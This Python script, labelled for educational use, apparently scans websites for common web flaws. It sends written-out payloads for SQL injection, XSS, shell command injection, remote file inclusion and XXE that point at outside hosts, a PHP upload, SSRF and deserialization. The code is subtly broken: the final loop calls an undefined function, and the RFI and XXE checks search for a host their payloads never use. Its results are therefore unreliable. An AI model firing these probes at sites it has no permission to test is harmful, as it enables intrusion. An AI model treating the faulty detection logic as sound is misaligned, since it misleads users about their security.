"""
Author: Tiago Lopes, 2022 - tiago.lopes@sou.unifal-mg.edu.br

This script performs basic web application security checks for common vulnerabilities
using the requests library. 
FOR EDUCATIONAL PURPOSES.
Only test systems you own or have explicit permission to test.
"""

import requests
import logging

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

def is_vulnerable(response, pattern):
    return pattern in response.text if response else False

def test_open_directory(url):
    try:
        response = requests.get(url + "/")
        if response.status_code == 200:
            logging.info(f"[Open Directory] Potential vulnerability at {url}")
    except requests.RequestException:
        logging.warning(f"[Open Directory] Request failed for {url}")

def test_sql_injection(url):
    payload = "' OR 1=1 --"
    try:
        response = requests.get(f"{url}/?id={payload}")
        if is_vulnerable(response, payload):
            logging.info(f"[SQL Injection] Found at {url}")
    except requests.RequestException:
        logging.warning(f"[SQL Injection] Request failed for {url}")

def test_xss(url):
    payload = "<script>alert('XSS')</script>"
    try:
        response = requests.get(f"{url}/?input={payload}")
        if is_vulnerable(response, payload):
            logging.info(f"[XSS] Found at {url}")
    except requests.RequestException:
        logging.warning(f"[XSS] Request failed for {url}")

def test_rfi(url):
    payload = "http://site.com/script.php"
    try:
        response = requests.get(f"{url}/?file={payload}")
        if is_vulnerable(response, "evil.com"):
            logging.info(f"[RFI] Found at {url}")
    except requests.RequestException:
        logging.warning(f"[RFI] Request failed for {url}")

def test_command_injection(url):
    payload = "|whoami; echo INJECTING"
    try:
        response = requests.get(f"{url}/?input={payload}")
        if is_vulnerable(response, "INJECTING"):
            logging.info(f"[Command injection] Found at {url}")
    except requests.RequestException:
        logging.warning(f"[Command injection] Request failed for {url}")

def test_ssti(url):
    payload = "{{7*7}}"
    try:
        response = requests.get(f"{url}/?template={payload}")
        if is_vulnerable(response, "49"):
            logging.info(f"[SSTI] Found at {url}")
    except requests.RequestException:
        logging.warning(f"[SSTI] Request failed for {url}")

def test_xxe(url):
    payload = """<?xml version='1.0'?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://site.com/xxe.dtd'>]>
    <foo>&xxe;</foo>"""
    try:
        response = requests.post(url + "/xml", data=payload, headers={"Content-Type": "application/xml"})
        if is_vulnerable(response, "evil.com"):
            logging.info(f"[XXE] Found at {url}")
    except requests.RequestException:
        logging.warning(f"[XXE] Request failed for {url}")

def test_csrf(url):
    try:
        response = requests.get(url)
        if "CSRFToken" not in response.cookies:
            logging.info(f"[CSRF] Potential vulnerability at {url}")
    except requests.RequestException:
        logging.warning(f"[CSRF] Request failed for {url}")

def test_file_upload(url):
    files = {'file': ('test.php', '<?php echo "Vulnerable"; ?>', 'application/x-php')}
    try:
        response = requests.post(url + "/upload", files=files)
        if response.status_code == 200 and "test.php" in response.text:
            logging.info(f"[File Upload] Vulnerability found at {url}")
    except requests.RequestException:
        logging.warning(f"[File Upload] Request failed for {url}")

def test_ssrf(url):
    payload = "http://server.com"
    try:
        response = requests.get(f"{url}/?url={payload}")
        if is_vulnerable(response, "internalserver"):
            logging.info(f"[SSRF] Found at {url}")
    except requests.RequestException:
        logging.warning(f"[SSRF] Request failed for {url}")

def test_rce(url):
    payload = "echo 'Vulnerable'"
    try:
        response = requests.get(f"{url}/?input={payload}")
        if is_vulnerable(response, "Vulnerable"):
            logging.info(f"[RCE] Found at {url}")
    except requests.RequestException:
        logging.warning(f"[RCE] Request failed for {url}")

def test_admin_panel(url):
    try:
        response = requests.get(f"{url}/admin")
        if response.status_code == 200 and "Admin Panel" in response.text:
            logging.info(f"[Admin Panel] Possible auth bypass at {url}")
    except requests.RequestException:
        logging.warning(f"[Admin Panel] Request failed for {url}")

def test_idor(url):
    try:
        response = requests.get(f"{url}/?id=999")
        if "Unauthorized" not in response.text:
            logging.info(f"[IDOR] Found at {url}")
    except requests.RequestException:
        logging.warning(f"[IDOR] Request failed for {url}")

def test_deserialization(url):
    payload = 'O:10:"DummyClass":1:{s:6:"_data";s:9:"VULNERABLE";}'
    try:
        response = requests.post(url + "/deserialize", data=payload)
        if is_vulnerable(response, "VULNERABLE"):
            logging.info(f"[Insecure Deserialization] Found at {url}")
    except requests.RequestException:
        logging.warning(f"[Insecure Deserialization] Request failed for {url}")

# run all tests
def run_all(url):
    logging.info(f"Testing on {url}")
    test_open_directory(url)
    test_sql_injection(url)
    test_xss(url)
    test_rfi(url)
    test_command_injection(url)
    test_ssti(url)
    test_xxe(url)
    test_csrf(url)
    test_file_upload(url)
    test_ssrf(url)
    test_rce(url)
    test_admin_panel(url)
    test_idor(url)
    test_deserialization(url)
    logging.info(f"Complete test on {url}\n")

# list of websites
websites = [
    "https://example1.com",
    "https://example2.test"
]

for site in websites:
    run_all_tests(site)
